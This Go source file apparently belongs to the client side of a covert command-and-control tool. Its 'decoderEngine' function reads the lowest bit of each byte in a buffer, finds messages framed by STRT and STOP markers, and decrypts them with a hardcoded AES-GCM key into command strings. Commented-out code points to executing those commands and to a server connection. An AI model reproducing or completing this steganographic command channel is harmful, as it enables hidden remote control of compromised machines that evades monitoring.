package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    //"encoding/binary"
    "errors"
    "io"
    "fmt"
    "strings"
)

var key []byte = []byte{
    0x2b, 0x7e, 0x15, 0x16,
    0x28, 0xae, 0xd2, 0xa6,
    0xab, 0xf7, 0x15, 0x88,
    0x09, 0xcf, 0x4f, 0x3c,
}

func encrypt(key, plaintext []byte) (string, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        fmt.Println("aesNewCipher err -", err)
        return "", err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        fmt.Println("newGcm err -", err)
        return "", err
    }

    nonce := make([]byte, gcm.NonceSize()) // 12 bytes
    if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
        fmt.Println("Nonce Read err -", err)
        return "", err
    }

    // Seal(dst, nonce, plaintext, additionalData)
    // prepends nonce to the output so you get: nonce || ciphertext || tag
    return string(gcm.Seal(nonce, nonce, plaintext, nil)), nil
}

func decrypt(key, ciphertext []byte) (string, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        fmt.Println("aesNewCipher 2 err -", err)
        return "", err
    }
    gcm, err := cipher.NewGCM(block)
    if err != nil {
        fmt.Println("newGcm2 err -", err)
        return "", err
    }

    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize+gcm.Overhead() {
        fmt.Println("Detected ciphertext too small")
        return "", errors.New("ciphertext too short")
    }

    nonce, ct := ciphertext[:nonceSize], ciphertext[nonceSize:]
    pt, err := gcm.Open(nil, nonce, ct, nil)
    return string(pt), err
}

var(
	store_command int = 0
	chunkStartCheck string = "true"
	decoded_cmd_byte []byte

)

func decoderEngine(buf []byte) (string, string){

	var current_decoded_byte byte
	cmd_bitIndex :=0 
	var fifo4 []byte
	var finalCommand string = ""
	var isFullMessage string = "false"
	
	if chunkStartCheck=="true"{
		decoded_cmd_byte = decoded_cmd_byte[:0] //no pending STOP message
		for _, stegd_byte := range(buf[:8*4]){ //if server has a command to send, the first 4 bytes would be STRT, unless it is a big command
			lsb := stegd_byte & 1
			current_decoded_byte = (current_decoded_byte << 1) | lsb
			cmd_bitIndex++
			if cmd_bitIndex==8{
				fifo4 = append(fifo4, current_decoded_byte)
				cmd_bitIndex =0
			}
		}

		if "STRT"==string(fifo4){
			chunkStartCheck="false" 	//big commands will be taken care, by not performing this chek, until a STOP is encountered
		}else{
			return  "", "none"//dont bother decoding rest of the chunk
		}
	}
	fifo4 = fifo4[:0]
	
	for _, stegd_byte := range(buf[:len(buf)]){
		lsb := stegd_byte & 1
		current_decoded_byte = (current_decoded_byte << 1) | lsb

		cmd_bitIndex++
		if cmd_bitIndex==8{
			if store_command==1{
				decoded_cmd_byte = append(decoded_cmd_byte, current_decoded_byte)
			}
			fifo4 = append(fifo4, current_decoded_byte)

			if len(fifo4) > 4{
				fifo4 = fifo4[1:]
			}
			//fmt.Println("fifo4 state ", string(fifo4))
			if "STRT"==string(fifo4){
				store_command = 1
				isFullMessage = "false"
			}
			if "STOP"==string(fifo4){
				isFullMessage = "true"
				store_command = 0
				chunkStartCheck = "true"
				//fmt.Println("Pre decryptio = ", decoded_cmd_byte)
				finalCommand = strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)

				finalCommand , err:= decrypt(key, []byte(finalCommand))
				//if  echo_to_stdout=="true"{fmt.Println("decrypted cmd - ", finalCommand)}
				
				if err!=nil{
					fmt.Println("Client decrypt error -", err)
					return "echo 'decr err'", "decrErr"
				}
				decoded_cmd_byte = decoded_cmd_byte[:0]
				//fmt.Println("$>", finalCommand)
				//go executeCommand(finalCommand, uConn, reader) //executeCommand -> upload/scrobble
				return finalCommand, isFullMessage
			}
			//fmt.Println("Debug info, fifo4 status - ", string(fifo4))
			cmd_bitIndex =0
			current_decoded_byte = 0
		}
		//fmt.Println("Recieved ", n, " bits with value", string(buf[:n]), "and bytes ", buf[:n])
	}
	return finalCommand, isFullMessage
}